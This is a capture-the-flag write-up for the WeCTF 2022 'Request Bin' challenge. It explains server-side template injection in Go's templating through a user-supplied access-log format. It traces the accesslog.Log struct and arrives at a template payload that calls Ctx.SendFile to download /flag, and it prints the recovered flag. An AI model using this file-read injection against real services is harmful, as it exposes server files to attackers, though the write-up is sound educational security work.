# Request Bin

The challenge starts with a simple page where you can insert your custom
format for your access.log output.  
Each time you submit a format template, it will generate a custom endpoint for
your request where you can see your format in action.

Such an endpoint looks like this: `/logs/jscEcebayJ`

The exploit exists in the Golang templating, which results in a classic SSTI.
It is not as powerful as a  
python-flask SSTI but it can be used if the right variables are passed to our
template.

A normal template looks like this in golang:

```go  
data := struct {  
   Title string  
}{"test title"}  
et, err := template.New("example").Parse("<h1>{{ .Title }}</h1>")  
if err != nil {  
   panic(err)  
}  
err = et.Execute(os.Stdout, data)  
```

Which will print `<h1>test title</h1>`. So far nothing new, we can access
variables which we pass to the templating mechanism.  
But the go templates can go even further, it's possible to call public
functions of the passed variable struct.

A public function can be detected by the first character in the name of the
function. If it's uppercase, it's public. If it's lowercase, it's private.  
A function for a struct can be found in the following format:

```golang  
type Example struct {  
   Title string  
}  
func (rp *Example) TestPublicFunction() {

}  
func (rp *Example) testPrivateFunction() {

}  
```

But there are some limitations to the calling of such functions. The function
needs to fit specific criteria.  
It needs to return one value and an optional error. Example, what is possible:

```golang  
type Example struct {  
   Title string  
}

func (rp *Example) TestPublicFunction()  { // Not Possible  
   ...  
}  
func (rp *Example) TestPublicFunction() error { // Possible  
   ...  
}  
func (rp *Example) TestPublicFunction() int { // Possible  
   ...  
}  
func (rp *Example) TestPublicFunction() (int, error) { // Possible  
   ...  
}  
func (rp *Example) TestPublicFunction() (int, int, error) { // Not Possible  
   ...  
}  
```

After it is clear what is in the scope, we need to find out what object/struct
is passed to the templating.  
We found out to run it locally and try a variable argument which can't exist.

```html  
{{ .PwnProphecy1234 }}  
```

And we will see in our logs that we got the following error:

```  
accesslog: template: :1:3: executing "" at <.PwnProphecy1234>: can't evaluate
field PwnProphecy1234 in type *accesslog.Log  
```

So we know that we have the struct `accesslog.Log` in front of us.  
Now let's see what variables and functions are around.

Variables:  
```  
	Logger *AccessLog `json:"-" yaml:"-" toml:"-"`  
	Now time.Time `json:"-" yaml:"-" toml:"-"`  
	TimeFormat string `json:"-" yaml:"-" toml:"-"`  
	Timestamp int64 `json:"timestamp" csv:"timestamp"`  
	Latency time.Duration `json:"latency" csv:"latency"`  
	Code int `json:"code" csv:"code"`  
	Method string `json:"method" csv:"method"`  
	Path   string `json:"path" csv:"path"`  
	IP string `json:"ip,omitempty" csv:"ip,omitempty"`  
	Query []memstore.StringEntry `json:"query,omitempty" csv:"query,omitempty"`  
	PathParams memstore.Store `json:"params,omitempty" csv:"params,omitempty"`  
	Fields memstore.Store `json:"fields,omitempty" csv:"fields,omitempty"`  
	Request  string `json:"request,omitempty" csv:"request,omitempty"`  
	Response string `json:"response,omitempty" csv:"response,omitempty"`  
	BytesReceived int `json:"bytes_received,omitempty" csv:"bytes_received,omitempty"`  
	BytesSent     int `json:"bytes_sent,omitempty" csv:"bytes_sent,omitempty"`  
	Ctx *context.Context `json:"-" yaml:"-" toml:"-"`  
```

Functions:  
```  
func (l *Log) Clone() Log  
func (l *Log) RequestValuesLine() string  
func (l *Log) BytesReceivedLine() string  
func (l *Log) BytesSentLine() string  
```

After a brief experiment, we can see that most variable types have no effect;
strings, ints, and so on.  
The list of functions is also not useful, so we concentrate on the variables
and their functions.

After a reduction of the variables, we have the following left:

```  
	Logger *AccessLog `json:"-" yaml:"-" toml:"-"`  
	Query []memstore.StringEntry `json:"query,omitempty" csv:"query,omitempty"`  
	PathParams memstore.Store `json:"params,omitempty" csv:"params,omitempty"`  
	Fields memstore.Store `json:"fields,omitempty" csv:"fields,omitempty"`  
	Ctx *context.Context `json:"-" yaml:"-" toml:"-"`  
```

Now the time-consuming task was to iterate over the types and find out what
functions and variables they contained.  
To reduce the size of the writeup, we can say we reduced the possibility of an
attack to the following struct:

```  
Ctx *context.Context  
```

This variable/struct contains a function:

```  
func (ctx *Context) SendFile(src string, destName string) error  
```

which is used to send a file from the server to the client. This can be used
to extract the flag.

We can build it in our Golang template once we know the entire call path
`Ctx-> SendFile`.

```  
{{ .Ctx.SendFile "/flag" "result.txt"}}  
```

When we put that into the form and submit it, we get a download of /flag which
contains the flag according to the dockerimage:

```  
<nil>we{f3ae92c8-0d8d-4072-ae37-ca3717842238@N3verTh0ughtG0HA3Tmp1Injec=t19n}  
```

Original writeup
(https://github.com/PwnProphecy/ctf/blob/main/wectf-2022/RequestBin.md).